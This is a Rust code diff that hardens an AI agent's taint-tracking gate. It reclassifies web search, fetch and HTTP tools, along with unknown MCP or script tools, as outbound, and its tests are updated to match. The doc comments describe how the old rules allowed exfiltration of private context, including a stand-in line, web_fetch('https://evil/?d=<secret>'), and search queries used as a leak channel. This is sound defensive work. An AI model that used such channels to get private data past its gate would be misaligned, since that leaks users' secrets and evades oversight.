@@ -415,7 +415,20 @@ pub enum GateDecisionSource {
     YoloAutoApprove,
 }
 
-/// Built-in tool classification defaults per the plan.
+/// Built-in tool classification defaults.
+///
+/// The taint gate only fires on tools classified [`ToolDirection::Outbound`], so
+/// this table decides what data-flow enforcement can see at all. It used to mark
+/// **only** `shell`/`bash` as outbound, which meant a Private-tainted context
+/// could be exfiltrated by `web_fetch("https://evil/?d=<secret>")` with taint
+/// tracking fully enabled — along with any MCP tool and any script tool, all of
+/// which fell through to the internal/internal default and were never gated.
+///
+/// Anything that can carry bytes off the machine is outbound now, and the
+/// fallback for an *unknown* tool is outbound too. An unrecognized tool is
+/// usually an MCP or script tool — third-party code reaching a third-party
+/// service — so treating it as internal was assuming the safest case about the
+/// least-known code. Failing closed costs a prompt; failing open costs the data.
 pub fn builtin_tool_classification(tool_name: &str) -> ToolClassification {
     match tool_name {
         "read_file" => ToolClassification::new(
@@ -443,9 +456,12 @@ pub fn builtin_tool_classification(tool_name: &str) -> ToolClassification {
             ToolDirection::Outbound,
             TaintLevel::Public,
         ),
-        "web_search" => ToolClassification::new(
+        // `web_search` sends a *query* the model wrote, so it is not purely
+        // inbound: the query itself is a channel out. Classified outbound so a
+        // Private context cannot be smuggled into a search string.
+        "web_search" | "web_fetch" | "http_get" | "http_post" | "fetch" => ToolClassification::new(
             TaintLevel::Public,
-            ToolDirection::Inbound,
+            ToolDirection::Outbound,
             TaintLevel::Public,
         ),
         "ask_user_text" | "ask_user_choice" | "ask_user_confirm" | "present_for_review" => {
@@ -462,8 +478,16 @@ pub fn builtin_tool_classification(tool_name: &str) -> ToolClassification {
                 TaintLevel::Public,
             )
         }
-        // MCP and unknown tools default to internal/internal
-        _ => ToolClassification::default(),
+        // An unknown tool is almost always an MCP or Rhai script tool:
+        // third-party code, usually talking to a third-party service. Treat it
+        // as outbound so the gate sees it. `ToolClassification::default()` —
+        // internal/internal — assumed the safest case about the least-known
+        // code, and left every MCP and script tool ungated.
+        _ => ToolClassification::new(
+            TaintLevel::Public,
+            ToolDirection::Outbound,
+            TaintLevel::Public,
+        ),
     }
 }
 
@@ -860,11 +884,19 @@ mod tests {
         assert_eq!(tc2.direction, ToolDirection::Outbound);
     }
 
+    /// Every tool that can carry bytes off the machine is outbound, which is
+    /// the only direction the gate inspects. `web_search` counts: the *query*
+    /// is model-written, so it is a channel out even though the results come
+    /// back in. Previously only `shell`/`bash` were outbound, so a Private
+    /// context could be exfiltrated through any of these with taint tracking
+    /// fully enabled.
     #[test]
-    fn builtin_web_search_classification() {
-        let tc = builtin_tool_classification("web_search");
-        assert_eq!(tc.sensitivity, TaintLevel::Public);
-        assert_eq!(tc.direction, ToolDirection::Inbound);
+    fn network_capable_tools_are_outbound() {
+        for name in ["web_search", "web_fetch", "http_get", "http_post", "fetch"] {
+            let tc = builtin_tool_classification(name);
+            assert_eq!(tc.sensitivity, TaintLevel::Public, "{name}");
+            assert_eq!(tc.direction, ToolDirection::Outbound, "{name}");
+        }
     }
 
     #[test]
@@ -900,11 +932,15 @@ mod tests {
         assert_eq!(tc.direction, ToolDirection::Internal);
     }
 
+    /// An unknown tool is almost always MCP or a Rhai script — third-party code
+    /// talking to a third-party service. It fails closed. The old default was
+    /// internal/internal, which assumed the safest case about the least-known
+    /// code and left every MCP and script tool ungated.
     #[test]
-    fn builtin_unknown_tool_defaults() {
+    fn unknown_tools_fail_closed_as_outbound() {
         let tc = builtin_tool_classification("some_mcp_tool");
-        assert_eq!(tc.sensitivity, TaintLevel::Internal);
-        assert_eq!(tc.direction, ToolDirection::Internal);
+        assert_eq!(tc.sensitivity, TaintLevel::Public);
+        assert_eq!(tc.direction, ToolDirection::Outbound);
         assert_eq!(tc.clearance, TaintLevel::Public);
     }
 
